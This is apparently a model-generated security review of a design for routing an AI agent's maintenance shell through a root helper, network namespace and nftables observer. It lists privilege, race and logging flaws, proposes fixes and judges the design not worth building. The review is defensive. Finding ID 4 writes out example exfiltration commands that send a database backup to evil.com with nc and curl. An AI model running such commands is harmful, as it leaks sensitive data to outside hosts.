# observed-route DESIGN panel: openai/gpt-5.1

_finish=stop seconds=61.0 cost=$0.0801 usage={'prompt_tokens': 16956, 'completion_tokens': 5888, 'total_tokens': 22844, 'cost': 0.080075, 'is_byok': False, 'prompt_tokens_details': {'cached_tokens': 0, 'cache_write_tokens': 0, 'audio_tokens': 0, 'video_tokens': 0}, 'cost_details': {'upstream_inference_cost': 0.080075, 'upstream_inference_prompt_cost': 0.021195, 'upstream_inference_completions_cost': 0.05888}, 'completion_tokens_details': {'reasoning_tokens': 0, 'image_tokens': 0, 'audio_tokens': 0}}_

ID 1 / PRIV-HELPER DROP-BOUNDARY TOO WIDE  
SEVERITY: HIGH  
WHERE: Privileged helper step 5 (setns + drop + exec bwrap)  

CONCRETE ATTACK OR FLAW  
Right now the “privileged boundary” is effectively “everything up to the `exec bwrap` syscall.” That’s a long window: the helper is root, with CAP_NET_ADMIN and friends, in the target netns and host ns, right up until the last line. Any bug in argument parsing, env construction, path resolution, or fd handling inside the helper is now part of the trusted TCB. You are *assuming* “fixed args” make this safe, but that has to be implemented perfectly:  

- If the helper accepts any untrusted input (argv/env) to influence *anything* before the drop (e.g. workspace path, runid, nft binary path, iproute2 binary paths, debug flags), that is a root attack surface.  
- If the helper fails to:  
  - call `setgroups([])` before `setgid`,  
  - clear all four cap sets (`CapEff`, `CapPrm`, `CapBnd`, `CapInh`) and ambient caps, **and**  
  - set `PR_SET_NO_NEW_PRIVS = 1`  
  then the payload can regain privilege (via file caps, setuid, or ambient caps crossing exec).  
- If the helper does not close or sanitize all inherited fds, the shell gets file descriptors pointing at privileged resources (e.g. netlink sockets, nftables control sockets, /dev/mem-style devices, or a log pipe that can be abused).  
- If cwd or PATH or LD_* env are inherited from an untrusted context, they can affect *helper internals* if it ever spawns any subprocess before the drop (ip, nft, sysctl, etc.), allowing PATH shadowing / LD_PRELOAD against those children.  

There’s also an architectural race: you create `/run/netns/salient_route_u<uid>_<runid>` via `ip netns add`, then later call `setns(2)` on that path. `/run/netns` is *just* a mountpoint pinned to a set of named namespaces. If anything else on the host can manipulate that directory (misconfigured permissions, tmpfiles rule, distro quirk, container root with host mounts), a symlink/rename race can redirect your `setns` fd to an attacker-controlled netns.  

Another vector: reserved-name collisions and concurrency. If two helpers for the same uid and same runid can run concurrently (e.g. retry logic, process supervisor quirks), they will both try to `ip netns add`/delete the same reserved name and both assume they own it. Depending on iproute2 behavior, one will see “already exists” and may skip setup but *still* drop/setns and exec, inheriting another run’s netns and its nft rules (or a malicious one) — which can break the “single observed route” and attribution assumptions.  

WHETHER ANOTHER CONTROL CATCHES IT  
The existing bwrap guard (caps-dropped, NoNewPrivs) only runs *inside* the bwrap sandbox. It cannot defend against:  

- bugs in the helper before the exec;  
- setns races or mis-binding `/run/netns/<name>`;  
- a wrong netns with no observer installed;  
- leaked fds or environment that contain privileged handles.  

So this is not caught by existing controls.  

FIX-OR-REDESIGN  
- Minimize the pre-drop code path aggressively: do all `ip`/`nft`/`sysctl` work in a *separate short-lived root process* that **never** touches untrusted argv/env; have a tiny second helper that only does: open `/run/netns/<name>` (O_RDONLY|O_CLOEXEC|O_NOFOLLOW), `setns(fd, CLONE_NEWNET)`, then:  
  - `setresgid(collab_gid, collab_gid, collab_gid)`  
  - `setgroups([])` (before setgid)  
  - `setresuid(collab_uid, collab_uid, collab_uid)`  
  - drop all capabilities with `prctl(PR_CAPBSET_DROP, ...)` loop, clear inheritable and ambient caps, set `PR_SET_NO_NEW_PRIVS = 1`, and verify via `/proc/self/status`.  
  - `closefrom(3)` to 1024 (or similar) so there are no mystery fds.  
  - `execve(bwrap, fixed_argv, minimal_env)`  
- Ensure `/run/netns` ownership and mode are checked at runtime (`stat`) and refuse to operate if it isn’t root:root 0755. Use `openat` + `O_NOFOLLOW` on `/run/netns` to defeat symlink races.  
- Encode a monotonically increasing, collision-free runid (e.g. UUID or 128‑bit random) and keep a PID+runid+uid mapping in a small root-owned state dir. Refuse to attach to a netns if a mapping for that name already exists or is in use.  
- Consider flipping the structure: call bwrap first (as root, with `--unshare-user` and —if you really must— `--uid 0`/`--gid 0` inside), then, *inside* the bwrap but still root, perform the `setns`+drop. That collapses your root TCB to “bwrap + one small wrapper” and isolates any pre-drop bug away from the full host fs view.  

---

ID 2 / SUDO INVOCATION AS AN INJECTION SURFACE  
SEVERITY: HIGH  
WHERE: Invocation of `salient-route-helper` via `sudo -n`  

CONCRETE ATTACK OR FLAW  
The design assumes “`sudo -n /usr/local/lib/salient/salient-route-helper <fixed args>`” is safe, but does *not* specify the sudoers rules required. Common mistakes turn this into an escalation surface:  

- If sudoers uses a *pathless* command spec (`salient-route-helper` rather than `/usr/local/lib/salient/salient-route-helper`), a malicious user can drop a fake binary earlier in PATH and get arbitrary root.  
- If sudoers allows additional arguments (`NOPASSWD: /usr/local/lib/salient/salient-route-helper *`), the caller (which includes the governed agent process, possibly influenced by model input) can pass attacker-controlled args that influence the privileged step.  
- If environment preservation (`env_keep`) is misconfigured, LD_PRELOAD, PYTHONPATH, or locale variables may affect the helper if it ever spawns subprocesses or uses dlopen-backed libraries before dropping privilege.  
- `sudo` may itself be tricked if `-n` behavior is not enforced by policy; on some systems “sudo -n” will still prompt or run a wrapper that *ignores* `-n`, and the helper’s prober will block waiting for input.  

WHETHER ANOTHER CONTROL CATCHES IT  
No. The observer and bwrap have no say in how sudo is configured, and the ladder only sees a boolean “helper reachable,” not whether its invocation surface is narrow.  

FIX-OR-REDESIGN  
- Specify and enforce an exact sudoers entry, e.g.:  

  `collab_uid ALL=(root) NOPASSWD: /usr/local/lib/salient/salient-route-helper --mode=prepare --uid=collab_uid --runid=*`  

  with `NOEXEC:`, `SETENV: N`, and *no* wildcard on the tool path.  
- Make `salient-route-helper` robust against extraneous args: parse strictly; reject unknown flags; refuse to run if argv/env are not exactly what is expected.  
- For belt-and-suspenders: use a root-owned wrapper script that validates environment and the exact argv vector before execing the real helper.  

---

ID 3 / NETNS NAME RACE & SETNS TARGET CONFUSION  
SEVERITY: HIGH  
WHERE: Helper steps 1 and 5 (create named netns, then setns into it)  

CONCRETE ATTACK OR FLAW  
The helper relies on `ip netns add salient_route_u<uid>_<runid>` -> `/run/netns/<name>` then `setns` via that name. Problems:  

- `ip netns add` creates the namespace and binds it at `/run/netns`, but nothing in the design asserts that `/run/netns` itself is immutable and not writable by unprivileged users or another container. If some misconfigured unit (or future distro change) puts `/run/netns` on a tmpfs with loose perms, an attacker can pre-create or swap `/run/netns/salient_route_...` with a symlink/hardlink to another netns fd. `setns` follows the file; you join the wrong namespace. That wrong ns might:  
  - have no observer;  
  - have an alternate route;  
  - be pre-populated with other veth links.  
- Concurrent execution with the same `(uid, runid)` can produce ABA behavior: run A creates the ns; run B sees it exists and “reuses” it; run A tears it down at exit, and a new netns with the *same* name is later created for a different run. The audit trail for run B is now linked to A’s or C’s netns.  

WHETHER ANOTHER CONTROL CATCHES IT  
The “per-run in-child guard” only verifies that “the netns is the prepared one,” but the ADR doesn’t spell out *how*. If that guard is just checking “netns ≠ parent” (like `netns.wrap_no_network`), then any different netns will pass, including a malicious or stale one. There is no explicit scheme here tying “prepared ns X” to “helper-run Y” in a way an attacker cannot spoof.  

FIX-OR-REDESIGN  
- Store a random, high-entropy token (e.g. a 128-bit nonce) as a netns-local property only root can set, for instance:  
  - create a small root-owned file with that token in a private mount namespace bound only inside the new netns, or  
  - add an nftables rule in the host specific to that ns and runid, and verify it from the observer.  
  Then have the in-child guard *read and match* that token before claiming “observed_route.”  
- Use `openat(2)` on `/run/netns` with `O_DIRECTORY|O_NOFOLLOW`, then `openat` the name with `O_RDONLY|O_CLOEXEC|O_NOFOLLOW`. Refuse to proceed if the fd’s `fstat` shows anything but `S_IFREG` with root:root and expected mode.  
- Make netns names per-run *unpredictable* (cryptographic random suffix) so pre-creation and collision are much harder, and keep per-run state in a root-only dir that prevents ABA reuse.  

---

ID 4 / OBSERVER PARTIALITY: UDP/DNS/ICMP LEAKS W/O SEMANTIC ACKNOWLEDGEMENT  
SEVERITY: MEDIUM  
WHERE: Observer design (FORWARD/iifname hook) and trade vs `egress.py`  

CONCRETE ATTACK OR FLAW  
The FORWARD/iifname observer is explicitly “all-protocol recorder semantics” but only logs `ip daddr . dport` and only for the protocols/rules you actually implement. DNS (UDP/53), QUIC, custom UDP protocols, and raw ICMP-based exfil channels are not meaningfully recorded beyond dest IP:port, if at all. Since this path is *not* tied into `egress.py`’s per-host allowlist or semantic caps, a human-approved shell can do:  

- `nc -u evil.com 443 < /var/log/db_backup.sql`  
- `curl --resolve evil.com:443:1.2.3.4 https://evil.com/…` (DNS names hidden, SNI misaligned)  
- custom QUIC/UDP-based exfil, which you already call out as residual  

and the system’s story is just: “we recorded dest ip:port; that’s fine.” The “sole content-mediated path” guarantee is materially weakened: a large class of things users assumed would require `net.get/net.post` caps (e.g. HTTP POST to nonallowlisted host) now simply go out through this bulk pipe and are only *logged*. There is no cap enforcement, no hostname-level policy, and no semantic integration with the egress log.  

WHETHER ANOTHER CONTROL CATCHES IT  
No. The ADR admits this deliberately (“dest-only observation … EVIDENCE, not a gate”), but it doesn’t surface a *different* policy story or cap namespace for maintenance egress. An operator reading the egress log may incorrectly believe the same constraints apply everywhere, especially because `egressobserver.py` reconciles *that* channel.  

FIX-OR-REDESIGN  
- At minimum, make the policy explicit and mechanically visible: introduce a distinct “maintenance_bulk_egress” capability or flag, and surface in logs that these destinations were reached via the non‑mediated maintenance path (not via `egress.py`).  
- For host-level protection, add a cheap allowlist: force maintenance TCP/443 traffic through a simple transparent TCP proxy that checks SNI against a configured allowlist, or at least *blocks* connections to obviously non-approved destinations (e.g. avoid 0.0.0.0/0 if operator wants a strict mode).  
- If you can’t afford enforcement complexity now, then narrow what’s allowed: DNS + apt mirrors + SSH to preconfigured ops hosts, not “full arbitrary Internet with only dest logging.”  

---

ID 5 / OBSERVER COMPLETENESS: FORWARD HOOK LIMITATIONS  
SEVERITY: MEDIUM  
WHERE: Host nft FORWARD/iifname observer (step 2)  

CONCRETE ATTACK OR FLAW  
You assume the FORWARD hook with `iifname sr<runid>H` and a `FORWARD` policy drop + explicit accept sees *every* egress from the veth. Subtleties:  

- IPv6: you disable IPv6 in the *netns*, but if that ever fails (sysctl missing, /proc unmounted, or a future kernel change that ignores the setting for some paths), you may get v6 traffic that either:  
  - is not matched by your v4-only rules, or  
  - is accepted by some other host firewall rule.  
- Fragments: nft’s rules on l4proto and dport typically only match on the first fragment (where headers exist). Later fragments might traverse different rules or hit generic ACCEPT if your v4/v6 tables already have global policies. You state `FORWARD policy drop`, but if the table priority or chain ordering is wrong (other tables or chains add earlier ACCEPTs), some traffic can bypass your chain and thus your logging.  
- Non-TCP/UDP protocols: “explicit accept only for observed protocols (TCP+UDP established/new, ICMP for PMTU)” leaves a gap: if some exotic protocol (e.g., GRE, ESP, SCTP) is allowed elsewhere in the host firewall and your chain is not the last word, it can pass unlogged.  

WHETHER ANOTHER CONTROL CATCHES IT  
The “per-run guard emits a POSITIVE token only after it verifies the netns is the prepared one AND the observer is live.” But “observer is live” is underspecified — if that’s simply “our nft table exists and has some rule,” that doesn’t guarantee that all packets must flow through it or that any particular proto/family is covered. There is nothing binding the correctness of the nft program to the “observed_route” token.  

FIX-OR-REDESIGN  
- Install your chains at a priority that ensures they see traffic before *any* other user tables (e.g. dedicated table with very low priority, policy DROP). Then for all non‑maintenance traffic, explicitly accept via other chains; for maintenance veth iifname, allow only through your logging path.  
- In the helper, *verify* via `nft -a list chain` that:  
  - FORWARD default policy is drop;  
  - the only ACCEPT rules matching `iifname sr<runid>H` are the ones that also perform logging;  
  - there is no global ACCEPT or jump that shortcuts your logging for that interface.  
  Refuse to emit the “observed_route” token if these invariants fail.  
- Consider having the observer also log non-TCP/UDP traffic with reduced metadata (dest ip only) and explicitly dropping all non-listed L4 protocols for the veth.  

---

ID 6 / JOIN SEMANTICS: BWRAP + INHERITED NETNS  
SEVERITY: MEDIUM  
WHERE: Helper setns + bwrap without `--unshare-net`  

CONCRETE ATTACK OR FLAW  
The plan is: helper `setns` into prepared netns while root, then drop to collab uid, then `exec bwrap --unshare-user --cap-drop ALL --disable-userns` *without* `--unshare-net`. Key issues:  

- `--unshare-user` + `--disable-userns` runs bwrap *inside* a userns created by bwrap. That userns is nested inside your helper’s userns (root’s). You must ensure your privilege-drop sequence happens in the *outer* (host) userns before you hand over to bwrap; otherwise, bwrap’s root-inside-userns doesn’t matter — the process is *also* root in the host ns.  
- `--disable-userns` prevents any further `unshare(CLONE_NEWUSER)` inside the sandbox, but it does not itself constrain your initial `setns(CLONE_NEWNET)` action; a bug or misordering in the way you call bwrap can still leave capabilities ambient or bounding set bits non-zero that cross into the child userns.  
- bwrap itself is in your TCB here: a future bwrap bug that accidentally regains some caps in the parent userns or mishandles `NoNewPrivs` could re-open CAP_NET_ADMIN in the netns you prepared.  

WHETHER ANOTHER CONTROL CATCHES IT  
Your internal cap guard in the existing maintenance sandbox checks caps and NoNewPrivs *inside* the bwrap userns *after* exec. That’s good, but only if you actually reuse that guard with the new netns arrangement. The ADR doesn’t state that explicitly. If cap state after bwrap isn’t verified (like in PR #42), you can no longer rely on the “mask is un-removable” defense.  

FIX-OR-REDESIGN  
- Reuse the *exact* guard as in PR #42 inside the observed-route maintenance sandbox: check CapEff/Prm/Bnd/Amb == 0 and NoNewPrivs==1 before emitting the positive token. Do not treat bwrap as trusted.  
- In the helper, call `prctl(PR_SET_NO_NEW_PRIVS, 1)` *before* execing bwrap, and enforce full cap-bounds clearing. Then in the guard, assert those conditions; if they don’t hold, fail closed to NETNS_ROUTELESS.  
- Consider simplifying: instead of pre-joining the netns in the helper, use bwrap’s `--setns /run/netns/<name>` (if supported in your version) so bwrap does the setns itself from the already-droped context, and you can remove `setns` from the root path entirely. That shrinks the privileged surface measurably.  

---

ID 7 / FAIL-CLOSED LADDER: CACHED PROBE & RACE TO ROUTED-BUT-UNOBSERVED  
SEVERITY: MEDIUM  
WHERE: `observed_route_available()` probe + per-run guard + teardown  

CONCRETE ATTACK OR FLAW  
The ladder claims “never routed-but-unobserved.” That depends on two things:  

- The *probe* (`observed_route_available()`) must not leave any persistent route/firewall artifacts that subsequent runs can leverage without going through the observer install path again.  
- The *per-run guard* must only emit the positive token if *this* run’s observer is live and bound to *this* netns.  

Issues:  

- Your design mirrors `egressobserver.observer_available()`, which caches only a positive result. If the initial helper probe installs rules, then fails teardown (e.g. `nft delete` fails transiently, or helper crashes before cleanup), the veth route/MASQ/observer table may remain. A later run may skip full setup because “available” is cached and then run with stale/partially-removed rules — potentially routed but not correctly observed.  
- If the per-run helper installs the veth+NAT but fails to install the observer rule successfully (nft error, no privilege, schema mismatch), and your guard only checks for “some table exists” and not that the rule is actively counting traffic from this veth, the guard might emit a false-positive “observed_route” token.  
- Teardown races: if teardown of veth and nft rules happens *after* bwrap exits but before all conntrack/NAT state expires, packets from a subsequent run (or even another process) may still use the old NAT mapping, and the observer for the new run will conflate those with the new session. That’s not strictly “unobserved,” but it corrupts attribution and the “per-run” semantics.  

WHETHER ANOTHER CONTROL CATCHES IT  
No. The ladder only encodes the boolean result of the guard; it cannot distinguish “observer misconfigured but present” vs “observer truly live.” The existing `egressobserver` doesn’t help for this path (different chain and key).  

FIX-OR-REDESIGN  
- Do *not* cache a “route helper available” result across runs; re‑probe in a cheap way every time, but base the positive guard **only** on per-run checks.  
- In the helper’s per-run guard, validate:  
  - nft shows your FORWARD chain present;  
  - a synthetic test packet sent from inside the netns (e.g. `ping` or a tiny UDP packet to 127.0.0.1 or a known test IP) results in an observer counter increment;  
  - only then emit the positive token. If any of these fail, tear down what you created and fall back to SANDBOX_ROUTELESS.  
- Ensure teardown is idempotent and scoped to the known veth name, netns name, and table name. Maintain a small root-owned state file per run to detect and clean up orphaned resources on the next invocation before starting anything new.  

---

ID 8 / AUDIT TRAIL TRUST EROSION  
SEVERITY: LOW  
WHERE: Overall model; observed route vs `egress.py`  

CONCRETE ATTACK OR FLAW  
The egress story used to be: “egress.py is the sole IP path, and its logs align with the kernel via the strong observer.” After this ADR, the story becomes: “egress.py is the sole content-mediated path, plus there is a separate high-bandwidth maintenance path that we *only* log IP:port for.” That’s a qualitative downgrade in assurance, but the documentation doesn’t require user-facing tooling or governance to distinguish them clearly. Reviewers looking at logs may incorrectly assume all outgoing IP traffic must pair with an `EgressRecord` and net-caps; the maintenance shell now invalidates that assumption.  

WHETHER ANOTHER CONTROL CATCHES IT  
No internal control fixes this; it’s a governance and UX issue.  

FIX-OR-REDESIGN  
- Tag all observed-route events distinctly in the audit trail (e.g. “maintenance_egress” vs “mediated_egress”) and make sure dashboards and alerts treat them differently.  
- Update operator documentation and any policy language to explicitly say: “maintenance shell has a second, dest-only logged egress path; it is not subject to egress.py caps.”  

---

META-QUESTION: IS THIS WORTH BUILDING VS KEEPING MAINTENANCE NETWORK-LESS?  

Given the current tradeoffs, I don’t think so. You are adding:  

- a non-trivial root helper that executes payloads,  
- a complex nftables-based routing plus observation path, and  
- a second IP channel that is *only* dest-logged, not mediated,  

in exchange for “git/apt/ssh work in the maintenance shell,” but you are *not* actually reinstating strong governance — just observability. The residual exfil capacity via DNS/UDP/QUIC and arbitrary TCP destinations is very high, and the safety story becomes much harder to explain and audit. Compared to:  

- **Alternative 1: keep maintenance network-less.** This keeps the model simple and strong: all network from the agent continues to go through `egress.py` and its caps. Operators who need `apt` or `git` can either use `egress.py` wrappers or attach to the host directly under their own uid.  
- **Alternative 2: userspace networking (pasta/slirp4netns).** This avoids a root helper and keeps your existing OUTPUT/skuid observer semantics. Yes, it’s another dependency and a userspace stack in the data path, but the security story is easier: you still have an unprivileged executor, and your observer model is unchanged. Given the complexity of the helper+nftns design and the risk of subtle mistakes, I would prefer a well-audited userspace tool plus your existing sandbox and observer code.  
- **Alternative 3: content-mediating proxy.** This is heavier code, but it directly answers the real operator need: “allow some maintenance network, but keep hostname-level policy and method/body awareness.” That seems like the right long-term direction; building a dest-only logging channel first may simply create operational debt.  

So: in its *current* form, with the root helper TCB and only dest-level observation, I judge the design as not worth building over the honest “maintenance is network-less” baseline. If you insist on enabling network for maintenance, I’d favor either a carefully-scoped userspace networking tool plus your existing observer, or going straight to a coarse content-mediating proxy for a small set of maintenance hosts.  

---

STEELMAN (2–3 sentences)  
If you absolutely must restore network to the maintenance shell, this design has a coherent safety story *if* you nail the helper’s privilege drop, harden the netns naming and setns joins, and make the FORWARD hook truly comprehensive. In that tightened form, you’d have a single, enforced egress path for maintenance with strong attribution and a clear audit trail of all dest ip:port pairs, while preserving the bwrap-based deputy sealing and existing isolation guarantees. It’s a defensible compromise between operational usability and security in environments where operator-approved maintenance needs real network access.  

VERDICT: SERIOUS_FLAWS — as proposed, the architecture has multiple sharp edges (root helper TCB, netns/setns races, partial observer coverage) and meaningfully weakens the “sole IP path” guarantee; the single highest-value change would be to *avoid a custom root helper entirely* by either (a) keeping maintenance network-less or (b) using a dedicated, well-audited userspace networking tool with the existing observer, rather than building and maintaining this complex, privileged routing stack.
